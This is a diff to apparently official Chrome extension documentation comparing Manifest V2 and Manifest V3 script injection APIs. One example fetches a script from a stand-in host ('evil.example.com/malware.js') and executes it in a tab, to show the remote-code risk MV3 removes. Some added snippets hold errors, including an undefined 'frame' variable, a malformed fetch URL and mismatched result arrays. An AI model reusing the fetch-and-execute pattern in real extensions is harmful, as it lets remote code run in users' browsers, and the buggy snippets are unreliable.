@@ -75,11 +75,14 @@ access. We knew that if we wanted to address the remote code problem that we wou
 feature.
 
 ```js
-let result = await fetch('https://example.com/evil.js');
-let script = await result.text();
-chrome.tabs.executeScript({
-  code: script,
-});
+(async function() {
+  let result = await fetch('https://evil.example.com/malware.js');
+  let script = await result.text();
+
+  chrome.tabs.executeScript({
+    code: script,
+  });
+})();
 ```
 
 We also wanted to clean up some other, more subtle issues with the Manifest V2 version's design,
@@ -136,15 +139,16 @@ page.
 
 ```js
 // Manifest V2 extension
-let userReq = await fetch('https://example.com/greetUser.js');
-let userScript = await userReq.text();
+chrome.browserAction.onClicked.addListener(async (tab) => {
+  let userReq = await fetch('https://example.com/greet-user.js');
+  let userScript = await userReq.text();
 
-chrome.browserAction.onClicked.addListener((tab) => {
   chrome.tabs.executeScript({
     // userScript == 'alert("Hello, <GIVEN_NAME>!")'
     code: userScript,
   });
 });
+
 ```
 
 While Manifest V3 extensions can't use code that isn't bundled with the extension, our goal was to
@@ -155,15 +159,16 @@ developers to modify an extension's runtime behavior based on user settings or a
 
 ```js
 // Manifest V3 extension
-let userReq = await fetch('https://example.com/user-data.json');
-let user = await userReq.json();
-let givenName = user.givenName || '<GIVEN_NAME>';
-
 function greetUser(name) {
   alert(`Hello, ${name}!`);
 }
-chrome.action.onClicked.addListener((tab) => {
-  chrome.tabs.executeScript(tab.id, {
+chrome.action.onClicked.addListener(async(tab) => {
+  let userReq = await fetch('/https://example.com/user-data.json');
+  let user = await userReq.json();
+  let givenName = user.givenName || '<GIVEN_NAME>';
+
+  chrome.scripting.executeScript({
+    target: { tabId: tab.id },
     func: greetUser,
     args: [givenName],
   });
@@ -179,13 +184,18 @@ frame in the tab.
 ```js
 // Manifest V2 extension
 chrome.browserAction.onClicked.addListener((tab) => {
-  chrome.tabs.executeScript(tab.id, {
-    frameId: targetFrame1,
-    file: 'content-script.js',
-  });
-  chrome.tabs.executeScript(tab.id, {
-    frameId: targetFrame2,
-    file: 'content-script.js',
+  chrome.webNavigation.getAllFrames({tabId: tab.id}, (frames) => {
+    let frame1 = frames[0].frameId;
+    let frame2 = frames[1].frameId;
+
+    chrome.tabs.executeScript(tab.id, {
+      frameId: frame1,
+      file: 'content-script.js',
+    });
+    chrome.tabs.executeScript(tab.id, {
+      frameId: frame2,
+      file: 'content-script.js',
+    });
   });
 });
 ```
@@ -196,11 +206,17 @@ API call. You can use use `chrome.webNavigation.getAllFrames` to get a list of a
 
 ```js
 // Manifest V3 extension
-chrome.action.onClicked.addListener((tab) => {
+chrome.action.onClicked.addListener(async (tab) => {
+  let frames = await new Promise((resolve) => {
+    chrome.webNavigation.getAllFrames({tabId: tab.id}, resolve);
+  });
+  let frame1 = frame[0].frameId;
+  let frame2 = frame[1].frameId;
+
   chrome.scripting.executeScript({
     target: {
       tabId: tab.id,
-      frames: [targetFrame1, targetFrame2],
+      frameIds: [frame1, frame2],
     },
     files: ['content-script.js'],
   });
@@ -211,25 +227,24 @@ chrome.action.onClicked.addListener((tab) => {
 
 We've also improved the way we return script injection results in Manifest V3. A "result" is
 basically the final statement evaluated in a script. Think of it like the value returned when you
-call `eval()` or execute a block of code in the Chrome DevTools console.
+call `eval()` or execute a block of code in the Chrome DevTools console, but serialized in order to
+pass results across processes.
 
 In Manifest V2, `executeScript` and `insertCSS` would return an array of plain execution results.
-This is fine if you only have a single injection point, but when injecting into all frames in a tab
-there's no way to tell which result is associated with which frame.
+This is fine if you only have a single injection point, but result order is not guaranteed when
+injecting into multiple frames so there's no way to tell which result is associated with which
+frame.
 
-For a concrete example, let's take a look at the results arrays returned by a Manifest V2 and a
+For a concrete example, let's take a look at the `results` arrays returned by a Manifest V2 and a
 Manifest V3 version of the same extension. Both versions of the extension will inject the same content script and we'll be comparing results on the same [demo page][iframe-demo].
 
 ```js
 //// content-script.js
-var url = new URL(window.location.href);
-if (url.pathname.endsWith('.html')) {
-  throw new Error('Incompatible URL path!');
-}
-'success';
+var headers = document.querySelectorAll('h1,h2,h3,h4,h5,h6');
+headers.length;
 ```
 
-When we run the Manifest V2 version, we get back an array of `['success', null]`. Which result
+When we run the Manifest V2 version, we get back an array of `[0, 1]`. Which result
 corresponds to the main frame and which is for the iframe? The return value doesn't tell us, so we
 don't know for sure.
 
@@ -238,12 +253,12 @@ don't know for sure.
 chrome.browserAction.onClicked.addListener((tab) => {
   chrome.tabs.executeScript({
     allFrames: true,
-    file: 'content-script.js';,
+    file: 'content-script.js',
   }, (results) => {
-    // results == ['success', null]
+    // results == [1, 0]
     for (let result of results) {
-      if (result !== 'success') {
-        console.log('An error occurred, but where?');
+      if (result > 0) {
+        // Do something with the frame… which one was it?
       }
     }
   });
@@ -261,10 +276,11 @@ chrome.action.onClicked.addListener(async (tab) => {
     target: {tabId: tab.id, allFrames: true},
     files: ['content-script.js'],
   });
-  // results == [{frameId: 0, result: 'success'}, {frameId: 1234, result: null}]
-  for (let output of results) {
-    if (output.result !== 'success') {
-      console.log(`An error occurred in frame ${output.frameId}`);
+  // results == [{frameId: 0, result: 1}, {frameId: 1234, result: 0}]
+  for (let result of results) {
+    if (result.result > 0) {
+      console.log(`Headers found in tab: ${tab.id}, frame: ${result.frameId}`);
+      // Headers found in tab: 7, frame: 0
     }
   }
 });
